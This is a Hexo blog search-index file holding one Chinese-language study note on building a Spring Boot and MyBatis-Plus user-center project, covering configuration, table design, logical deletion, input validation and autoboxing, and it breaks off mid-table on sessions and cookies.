<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UserCenter项目疑问记录</title>
      <link href="/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="UserCenter-项目疑问记录"><a href="#UserCenter-项目疑问记录" class="headerlink" title="UserCenter 项目疑问记录"></a>UserCenter 项目疑问记录</h3><p>如何进行企业级开发?其实不管做什么都需要事先做好规划.项目要实现的功能是什么，要怎么实现，做一个具体规划（预估时间），先完成框架搭建再去细化.</p><h4 id="项目完整开发流程"><a href="#项目完整开发流程" class="headerlink" title="项目完整开发流程"></a>项目完整开发流程</h4><ul><li>需求分析</li><li>设计（概要设计、详细设计）</li><li>技术选型（前端&#x2F;后端）</li><li>初始化（前端&#x2F;后端），引入需要的技术</li><li>搭建框架（Demo）【引入框架后可依据需求瘦身】</li><li>实现业务逻辑</li><li>测试（单元测试）</li><li>代码提交&#x2F;代码评审</li><li>部署</li><li>发布</li></ul><p><strong>Tips</strong></p><ol><li>框架瘦身阶段，每次删除一个文件都要重启项目是否能运行.</li><li>多查看官方文档.</li><li>养成好习惯，数据库相关操作语句做好本地或云端备份.</li></ol><p><strong>需要掌握的基本知识</strong></p><p>controller：只需接收请求，不做任何业务处理.倾向对请求参数本身的校验，较少涉及业务逻辑校验.<br>service: 业务逻辑处理（校验）有可能被contoller之外的类调用<br>mapper（dao）：数据访问层<br>model：数据封装类<br>utils：工具类（比如加密，日期转换，日期转换）<br>Lombook：帮助生成小的Java类实体对象</p><h4 id="Spring-Boot框架整合"><a href="#Spring-Boot框架整合" class="headerlink" title="Spring Boot框架整合"></a>Spring Boot框架整合</h4><ol><li><p>创建数据库</p><p><img src="/../imgs/2025-01/image-20250119104243355.png" alt="image-20250119104243355"></p></li><li><p>建表<br><img src="/../imgs/2025-01/image-20250119104354791.png" alt="image-20250119104354791"></p></li><li><p>引入需要的依赖，比如Junit4（Maven Repository）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- JUnit --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>4.配置yml文件.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><h4 id="Mybatis-plus"><a href="#Mybatis-plus" class="headerlink" title="Mybatis-plus"></a>Mybatis-plus</h4><p>新接触的技术文档学会去官网逐步学习.</p><h4 id="Resource和Autowired区别"><a href="#Resource和Autowired区别" class="headerlink" title="Resource和Autowired区别"></a>Resource和Autowired区别</h4><p>Resouce默认按照Bean对象名称进行注入，如果无法通过名称匹配则会按照类型注入.只能在Spring容器中使用.<br>Autowired默认按照类型注入如果有多个符合条件的Bean（多于一个匹配类型）可以结合@Qualifier注解按名称指定.</p><table><thead><tr><th>属性</th><th><code>@Resource</code></th><th><code>@Autowired</code></th></tr></thead><tbody><tr><td><strong><code>name</code></strong></td><td>支持，按名称注入</td><td>不支持</td></tr><tr><td><strong><code>type</code></strong></td><td>支持，按类型注入</td><td>不支持</td></tr><tr><td><strong><code>required</code></strong></td><td>不支持</td><td>支持，默认 <code>required=true</code>，可设置为 <code>false</code></td></tr></tbody></table><p><strong>推荐使用Resource</strong>.</p><h4 id="Runwith注解"><a href="#Runwith注解" class="headerlink" title="@Runwith注解"></a>@Runwith注解</h4><p><img src="/../imgs/2025-01/image-20250113211506790.png" alt="image-20250113211506790"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br></pre></td></tr></table></figure><p>使用@Runwith注解可解决注入对象为NULL问题</p><h4 id="Mapper和-MapperScan"><a href="#Mapper和-MapperScan" class="headerlink" title="@Mapper和@MapperScan"></a>@Mapper和@MapperScan</h4><p><img src="/../imgs/2025-01/image-20250113211801210.png" alt="image-20250113211801210"></p><p>主配置文件中使用@MapperScan注解等价于在mapper接口（scan扫描定义的路径就是包含扫描到mapper包下所有内容）</p><p><img src="/../imgs/2025-01/image-20250113211842054.png" alt="image-20250113211842054"></p><p><strong>当然前提都要保证配置文件【pom.xml没问题】</strong></p><table><thead><tr><th><strong>Spring Boot 版本</strong></th><th><strong>MyBatis-Plus 版本</strong></th><th><strong>MyBatis 版本</strong></th><th><strong>MySQL 驱动版本</strong></th><th><strong>MySQL 数据库版本</strong></th></tr></thead><tbody><tr><td>3.1.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>3.0.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.7.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.30 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.6.x</td><td>3.4.x - 3.5.x</td><td>3.4.x - 3.5.x</td><td>8.0.28 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.5.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.28 - 8.0.31</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.4.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.26 - 8.0.29</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.3.x</td><td>3.3.x</td><td>3.3.x</td><td>8.0.22 - 8.0.27</td><td>5.7.x &#x2F; 8.0.x</td></tr></tbody></table><p><strong>注意拉下来框架之后自己配置好MySQL对应依赖的content</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.6.13<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.5.9<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql-connector.version</span>&gt;</span>8.0.33<span class="tag">&lt;/<span class="name">mysql-connector.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数据表设计"><a href="#数据表设计" class="headerlink" title="数据表设计"></a>数据表设计</h4><table><thead><tr><th>特性</th><th><code>CHAR</code></th><th><code>VARCHAR</code></th></tr></thead><tbody><tr><td><strong>长度</strong></td><td>固定长度，无论实际内容多少</td><td>可变长度，仅存储实际内容</td></tr><tr><td><strong>存储空间</strong></td><td>占用固定空间，可能浪费存储</td><td>更节省空间，但有额外长度信息开销</td></tr><tr><td><strong>性能</strong></td><td>定长，性能更高</td><td>可变长度，性能略低</td></tr><tr><td><strong>适用场景</strong></td><td>长度固定的数据（如身份证号）</td><td>长度可变的数据（如用户名）</td></tr><tr><td><strong>尾部空格处理</strong></td><td>存储时补足空格，查询时忽略</td><td>存储时不 补足空格，查询时需精确匹配</td></tr><tr><td><strong>最大长度</strong></td><td>255 字符</td><td>65535 字节</td></tr></tbody></table><p>多留余地万一以后要修改 <strong>varchar！</strong></p><table><thead><tr><th>特性</th><th><code>INT</code></th><th><code>TINYINT</code></th></tr></thead><tbody><tr><td><strong>存储空间</strong></td><td>4 字节</td><td>1 字节</td></tr><tr><td><strong>取值范围（有符号）</strong></td><td>-2,147,483,648 ~ 2,147,483,647</td><td>-128 ~ 127</td></tr><tr><td><strong>取值范围（无符号）</strong></td><td>0 ~ 4,294,967,295</td><td>0 ~ 255</td></tr><tr><td><strong>适用场景</strong></td><td>大范围数据（如主键、自增 ID）</td><td>小范围数据（如状态、布尔值）</td></tr><tr><td><strong>性能</strong></td><td>处理速度略低，存储空间更大</td><td>存储效率高，适合小范围高效存储</td></tr></tbody></table><p>可以多使用tinyint 避免浪费空间.</p><p><strong>什么时候需要索引</strong></p><table><thead><tr><th><strong>场景</strong></th><th><strong>是否设计索引</strong></th></tr></thead><tbody><tr><td>高频查询的列</td><td>✅ 需要</td></tr><tr><td>作为主键或唯一性约束的列</td><td>✅ 需要</td></tr><tr><td>经常排序、分组的列</td><td>✅ 需要</td></tr><tr><td>大表中的查询条件列</td><td>✅ 需要</td></tr><tr><td>小表、数据量很少的表</td><td>❌ 不需要</td></tr><tr><td>写操作非常频繁的表</td><td>❌ 避免过多索引</td></tr><tr><td>低选择性的列（重复值较多）</td><td>❌ 一般不需要</td></tr><tr><td>从不在查询条件中出现的列</td><td>❌ 不需要</td></tr></tbody></table><p>在实际设计中，应结合业务需求和数据分布情况，合理设计索引以平衡性能与存储开销。</p><h4 id="DELETE-与-TRUNCATE-的差异总结"><a href="#DELETE-与-TRUNCATE-的差异总结" class="headerlink" title="DELETE 与 TRUNCATE 的差异总结"></a>DELETE 与 TRUNCATE 的差异总结</h4><table><thead><tr><th><strong>特性</strong></th><th><strong>DELETE</strong></th><th><strong>TRUNCATE</strong></th></tr></thead><tbody><tr><td><strong>类型</strong></td><td>DML（数据操作语言）</td><td>DDL（数据定义语言）</td></tr><tr><td><strong>作用范围</strong></td><td>可以带 <code>WHERE</code> 条件，删除部分或全部数据</td><td>删除表中所有数据，无法带条件</td></tr><tr><td><strong>触发器</strong></td><td>会触发触发器</td><td>不会触发触发器</td></tr><tr><td><strong>日志记录</strong></td><td>逐行记录删除操作，记录到事务日志中</td><td>不逐行记录，操作速度快</td></tr><tr><td><strong>事务支持</strong></td><td>支持事务，可以回滚</td><td>大多数数据库中不支持事务，操作不可回滚</td></tr><tr><td><strong>性能</strong></td><td>慢，逐行删除，记录日志</td><td>快，直接清空表</td></tr><tr><td><strong>表结构</strong></td><td>表结构、列、索引保留</td><td>表结构、列、索引保留</td></tr><tr><td><strong>AUTO_INCREMENT 重置</strong></td><td>不会重置 AUTO_INCREMENT</td><td>会重置 AUTO_INCREMENT</td></tr><tr><td><strong>使用场景</strong></td><td>删除部分数据或在事务中操作</td><td>清空表中所有数据，高效快速地删除大批量数据</td></tr></tbody></table><p>id由数据库分配-&gt;auto</p><p><img src="/../imgs/2025-01/image-20250113222854939.png" alt="image-20250113222854939"></p><h4 id="自动生成器使用"><a href="#自动生成器使用" class="headerlink" title="自动生成器使用"></a>自动生成器使用</h4><p>MybatisX插件自动根据数据库生成domain实体对象、mapper（操作数据库的对象）、mapper.xml（定义了mapper对象和数据库的关联，可以在其中写自己的SQL）、service（包含常用的增删改查，可能被复用的方法都可以写到service中）、serviceImpl（实现具体service）</p><p>使用Mybatisx插件自动生成需要的类【右键表名】</p><p><img src="/../imgs/2025-01/image-20250114124902816.png" alt="image-20250114124902816"></p><p><img src="/../imgs/2025-01/image-20250114125026113.png" alt="image-20250114125026113"></p><p>根据Mybatisplus和Mybatis框架机制 会自动帮我们生成需要的Id（用户新增的ID会把塞到user表中）<br><img src="/../imgs/2025-01/image-20250114131948027.png" alt="image-20250114131948027"></p><h4 id="Mybatis-Plus默认转换机制"><a href="#Mybatis-Plus默认转换机制" class="headerlink" title="Mybatis-Plus默认转换机制"></a>Mybatis-Plus默认转换机制</h4><p>写了service的Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.service;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.model.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Assertions;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用户服务测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tesAddUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line">        user.setUserAccount(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setAvatarUrl(<span class="string">&quot;https://tse3-mm.cn.bing.net/th/id/OIP-C.4RGfXFhVnIgc2CyGw-I9XAAAAA?w=208&amp;h=208&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7&quot;</span>);</span><br><span class="line">        user.setGender(<span class="number">1</span>);</span><br><span class="line">        user.setUserPassword(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        user.setPhone(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setEmail(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> userService.save(user);</span><br><span class="line">        System.out.println(user.getId());</span><br><span class="line">        Assertions.assertTrue(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现报错 查看官方文档<br><img src="/../imgs/2025-01/image-20250114132807433.png" alt="image-20250114132807433"></p><h3 id="mapUnderscoreToCamelCase"><a href="#mapUnderscoreToCamelCase" class="headerlink" title="mapUnderscoreToCamelCase"></a>mapUnderscoreToCamelCase</h3><ul><li><strong>类型</strong>：<code>boolean</code></li><li><strong>默认值</strong>：<code>true</code></li></ul><p>开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射。</p><p><strong>配置示例</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  configuration:</span><br><span class="line">    map-underscore-to-camel-case: true</span><br></pre></td></tr></table></figure><p><strong>提示</strong></p><p>在 MyBatis-Plus 中，此属性也将用于生成最终的 SQL 的 select body。如果您的数据库命名符合规则，无需使用 <code>@TableField</code> 注解指定数据库字段名。</p><h4 id="Mybatis-Plus默认删除机制"><a href="#Mybatis-Plus默认删除机制" class="headerlink" title="Mybatis-Plus默认删除机制"></a>Mybatis-Plus默认删除机制</h4><p>MyBatis-Plus 的逻辑删除功能会在执行数据库操作时自动处理逻辑删除字段。以下是它的工作方式：</p><ul><li><strong>插入</strong>：逻辑删除字段的值不受限制。</li><li><strong>查找</strong>：自动添加条件，过滤掉标记为已删除的记录。</li><li><strong>更新</strong>：防止更新已删除的记录。</li><li><strong>删除</strong>：将删除操作转换为更新操作，标记记录为已删除。</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="步骤-1-配置全局逻辑删除属性"><a href="#步骤-1-配置全局逻辑删除属性" class="headerlink" title="步骤 1: 配置全局逻辑删除属性"></a>步骤 1: 配置全局逻辑删除属性</h3><p>在 <code>application.yml</code> 中配置 MyBatis-Plus 的全局逻辑删除属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      logic-delete-field: deleted # 全局逻辑删除字段名</span><br><span class="line">      logic-delete-value: 1 # 逻辑已删除值</span><br><span class="line">      logic-not-delete-value: 0 # 逻辑未删除值</span><br></pre></td></tr></table></figure><h3 id="步骤-2-在实体类中使用-TableLogic-注解"><a href="#步骤-2-在实体类中使用-TableLogic-注解" class="headerlink" title="步骤 2: 在实体类中使用 @TableLogic 注解"></a>步骤 2: 在实体类中使用 <code>@TableLogic</code> 注解</h3><p>在实体类中，对应数据库表的逻辑删除字段上添加 <code>@TableLogic</code> 注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableLogic;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;    <span class="comment">// 其他字段...</span></span><br><span class="line">    <span class="meta">@TableLogic</span>    <span class="keyword">private</span> Integer deleted;&#125;</span><br></pre></td></tr></table></figure><h3 id="MyBatis-Plus-逻辑删除-vs-物理删除-区别表"><a href="#MyBatis-Plus-逻辑删除-vs-物理删除-区别表" class="headerlink" title="MyBatis-Plus 逻辑删除 vs 物理删除 区别表"></a><strong>MyBatis-Plus 逻辑删除 vs 物理删除 区别表</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>逻辑删除</strong></th><th><strong>物理删除</strong></th></tr></thead><tbody><tr><td><strong>定义</strong></td><td>不真正从数据库中删除记录，而是通过标识字段（如 <code>is_deleted</code>）标记记录已被删除。</td><td>直接从数据库中物理移除记录，记录彻底消失。</td></tr><tr><td><strong>是否保留数据</strong></td><td>数据仍然保留在数据库中，只是被标记为“已删除”，不会在查询中返回（默认情况下）。</td><td>数据从数据库中完全移除，无法恢复。</td></tr><tr><td><strong>实现方式</strong></td><td>- 依赖 MyBatis-Plus 的全局逻辑删除功能，通过配置逻辑删除字段（如 <code>deleted</code>）实现过滤逻辑。<br>- 在执行查询时，自动附加 <code>WHERE deleted = 0</code> 条件。</td><td>- 直接执行 <code>DELETE FROM table WHERE ...</code>，彻底删除记录。</td></tr><tr><td><strong>配置要求</strong></td><td>- 需要在实体类上添加逻辑删除字段（如 <code>@TableLogic</code> 注解）。<br>- 配置全局逻辑删除策略。</td><td>无额外配置，直接通过 MyBatis 或 MyBatis-Plus 的 <code>delete</code> 方法执行 SQL 删除操作。</td></tr><tr><td><strong>恢复数据</strong></td><td>可以通过更新逻辑删除标记字段（如将 <code>deleted</code> 从 <code>1</code> 改为 <code>0</code>）恢复数据。</td><td>删除的数据无法恢复，除非通过数据库备份还原。</td></tr><tr><td><strong>应用场景</strong></td><td>- 适用于需要保留历史数据以供审计或恢复的场景，例如：订单管理系统、用户管理系统中的账号停用功能。</td><td>- 适用于对数据一致性要求高、不需要保留任何删除痕迹的场景，例如：临时数据、无用数据的清理场景。</td></tr><tr><td><strong>SQL 性能</strong></td><td>查询时额外增加了过滤条件 <code>WHERE deleted = 0</code>，可能会略微影响性能，尤其是在数据量较大的情况下。</td><td>没有额外的过滤条件，查询性能更高，但没有保留数据的能力。</td></tr><tr><td><strong>法律&#x2F;合规性要求</strong></td><td>满足部分行业中对数据不可随意删除的合规性要求，例如金融系统、医疗系统等。</td><td>无法满足保留历史记录的法务合规要求，适合非监管场景下的数据删除。</td></tr></tbody></table><p><strong>复杂重复的校验使用工具Apache Commons Lang</strong><br><img src="/../imgs/2025-01/image-20250114135218842.png" alt="image-20250114135218842"></p><p><strong>用于校验用户账号是否出现特殊字符的正则表达式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//匹配 标点符号 (\pP)、符号字符 (\pS) 或 一个或多个空白字符 (\s+)。</span></span><br><span class="line"><span class="string">&quot;\\pP|\\pS|\\s+&quot;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ol><li><code>&quot;\\pP|\\pS|\\s+&quot;</code> 使用 Unicode 属性匹配字符，比 <code>[^a-zA-Z0-9_]</code> 更加精准和丰富。</li><li>如果需要明确匹配标点符号、符号字符和空白，可以使用 <code>&quot;\\pP|\\pS|\\s+&quot;</code>。</li><li>如果只需要简单排除非法字符（不属于某些范围的字符），可以使用 <code>[^a-zA-Z0-9_]</code>。</li></ol><h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a><strong>自动装箱和拆箱</strong></h4><table><thead><tr><th><strong>特性</strong></th><th><strong>自动装箱</strong></th><th><strong>自动拆箱</strong></th></tr></thead><tbody><tr><td><strong>方向</strong></td><td>基本数据类型 → 包装类</td><td>包装类 → 基本数据类型</td></tr><tr><td><strong>触发场景</strong></td><td>需要对象时，例如赋值给包装类变量或添加到集合中</td><td>需要基本类型时，例如参与运算或赋值给基本类型变量</td></tr><tr><td><strong>主要方法实现</strong></td><td>调用包装类的 <code>valueOf()</code> 方法</td><td>调用包装类的 <code>xxxValue()</code> 方法（如 <code>intValue()</code>）</td></tr><tr><td><strong>示例代码</strong></td><td><code>Integer integer = 10;</code> &#x2F;&#x2F; 等价于 <code>Integer.valueOf(10)</code></td><td><code>int value = integer;</code> &#x2F;&#x2F; 等价于 <code>integer.intValue()</code></td></tr><tr><td><strong>作用</strong></td><td>将基本数据类型变为对象，用于集合或对象需求场景</td><td>将对象转为基本类型，用于计算或基本类型需求场景</td></tr><tr><td><strong>注意点</strong></td><td>频繁装箱会有性能开销，可能导致产生大量对象</td><td>包装类是 <code>null</code> 时，会引发 <code>NullPointerException</code></td></tr><tr><td><strong>集合框架操作</strong></td><td><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</code></td><td><code>int value = list.get(0);</code></td></tr><tr><td><strong>对象赋值</strong></td><td><code>Integer integer = 10;</code></td><td><code>int num = integer;</code></td></tr><tr><td><strong>算术运算</strong></td><td><code>Integer a = 5; Integer b = 10; Integer sum = a + b;</code></td><td>在运算时，<code>a</code> 和 <code>b</code>会拆箱为 <code>int</code> 类型并执行计算</td></tr><tr><td><strong>方法调用</strong></td><td>传递基本类型参数，包装类参数会自动装箱</td><td>方法返回包装类对象，接收者为基本类型会自动拆箱</td></tr></tbody></table><p><img src="/../imgs/2025-01/image-20250114163625145.png" alt="image-20250114163625145"></p><p><img src="/../imgs/2025-01/image-20250114165428279.png" alt="image-20250114165428279"></p><p><strong>小Tip</strong><br>使用mapper注入思路更清晰，但功能不如直接使用ServiceImp继承全面.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//账号不能重复</span></span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;userAccount&quot;</span>, userAccount);</span><br><span class="line">        <span class="comment">//这里的this其实就是UserServiceImpl拥有继承的父类的所有可继承的方法</span></span><br><span class="line">        <span class="comment">// long count = this.count(queryWrapper); </span></span><br><span class="line">       <span class="comment">//上一行是直接使用继承的父类的功能的等价于使用Usermapper注入</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> userMapper.selectCount(queryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>请求参数很长的时候不建议用get【限流 获取IP 同一个IP登录过多次 封号】<br>校验 存储<br>使用JSON格式的话最好封装一个对象 单独储存参数<br><img src="/../imgs/2025-01/image-20250115110534408.png" alt="image-20250115110534408"></p><p>大体积对象变成小体积（使用序列化），节省数据传输时间</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>编写测试样例时，安装GenerateAllSetter插件可以快速生成默认值代码.<br><img src="/../imgs/2025-01/image-20250120220908304.png" alt="image-20250120220908304"></p><h4 id="IDEA自带的测试工具"><a href="#IDEA自带的测试工具" class="headerlink" title="IDEA自带的测试工具"></a>IDEA自带的测试工具</h4><p><img src="/../imgs/2025-01/image-20250115115048677.png" alt="image-20250115115048677"></p><p><img src="/../imgs/2025-01/image-20250115115322123.png" alt="image-20250115115322123"></p><h4 id="session一天失效"><a href="#session一天失效" class="headerlink" title="session一天失效"></a>session一天失效</h4><table><thead><tr><th>特性</th><th>Session</th><th>Cookie</th></tr></thead><tbody><tr><td><strong>存储位置</strong></td><td>数据存储在服务器端，客户端只保存Session 